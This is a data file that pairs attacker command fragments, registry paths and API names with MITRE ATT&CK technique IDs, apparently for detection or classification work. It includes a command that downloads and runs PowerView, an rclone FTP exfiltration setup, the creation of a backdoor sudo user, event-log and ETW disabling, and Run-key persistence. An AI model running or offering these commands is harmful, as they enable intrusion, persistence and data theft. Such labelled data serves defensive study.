HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\hosts,T1547
ClearEventLogW,T1070
"$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""",T1204
$TMPDIR/airportpaird,T1553
usermod --unlock art,T1078
wmic logicaldisk get,T1680
"&$rclone_bin config create ftpserver ""ftp"" ""host"" $ftp_server ""port"" $ftp_port ""user"" $ftp_user ""pass"" $ftp_pass",T1048
if($restart){,T1547
CreateLoginProfile,T1098
"rundll32.exe shell32.dll,Control_RunDLL ""$input_file""",T1218
"rundll32.exe URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""",T1218
Get-PassPol,T1201
Test-Connection $env:COMPUTERNAME,T1059
system version get,T1082
Add-Type -TypeDefinition @',T1036
"Set-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Common Startup"" -Value ""$new_startup_folder""",T1547
"Start-Process ""$Ammyy_Admin_Path""",T1219
"stop-process -name ""tor"" | out-null",T1090
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose,T1482
ssh_upload,T1083
"find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;",T1005
New-AzAutomationRunbook -Name $runbook_name -Type PowerShell -ResourceGroupName $resource_group -Description 'my-test-runbook' -AutomationAccountName $automation_account_name,T1078
"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
(0xd0b0),T1036
NtUnmapViewOfSection,T1055
RASSFM.DLL,T1556
regsvr32s,T1218
Invoke-WmiCommand,T1047
/LaunchAgents,T1543
useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art,T1110
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f,T1564
dir \\$computer_ip\admin$,T1135
"if [ $(cat /etc/os-release | grep -i 'Name=""ubuntu""') ]; then echo ""$username:$password"" | sudo chpasswd; else echo ""$password"" | passwd --stdin $username; fi;",T1136
"Get-ChildItem -Path ""$SitePackages"" | Where-Object { $_.Name -like ""*.pth"" }",T1546
Invoke-PSImage,T1027
"echo $machine >> ""$completed_list""",T1105
egui.exe,T1480
SRCheck,T1036
schtasks /create /tn TabletlnputServices /tr /sc minute /mo 10 /f,T1053
"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""",T1112
Set-ExecutionPolicy -Scope Process Bypass -Force,T1134
launchctl load -w,T1569
"ntdsutil ""set dsrm password"" ""sync from domain account $sync_account"" ""q"" ""q""",T1098
hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom,T1546
secedit /configure /db $secedit_db,T1547
gobfuscate,T1027
"if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i $interface; fi;",T1040
reg export HKLM\SOFTWARE\Microsoft\Evilreg $path\file.txt:evilreg.reg,T1564
Remove-NetEventSession -Name Capture007,T1040
"""$trufflesnout_path"" domain -n $domain",T1482
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f",T1547
networksetup -setsecurewebproxy $interface $proxy_server $proxy_port,T1090
chmod 2775,T1548
"New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\$ETWProviderGUID"" -Name Enabled -Value 0 -PropertyType ""DWord"" -Force",T1562
sudo cat /etc/sudoers,T1548
foreach ($User in $users) {,T1110
Driver,T1547
calc.exe,T1036
wmic useraccount get /ALL,T1033
"$sheet.Cells.Item(1,1) = ""=GET.WORKSPACE(26)""",T1204
gcloud compute disks list,T1680
HKCU\Software\bkfouerioyou,T1547
chattr,T1222
/proc/<PID>/environ,T1070
KB<digits>.zip,T1036
ProcessDebugPort,T1106
wfc.exe {PATH_ABSOLUTE:.xoml},T1127
"ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")",T1012
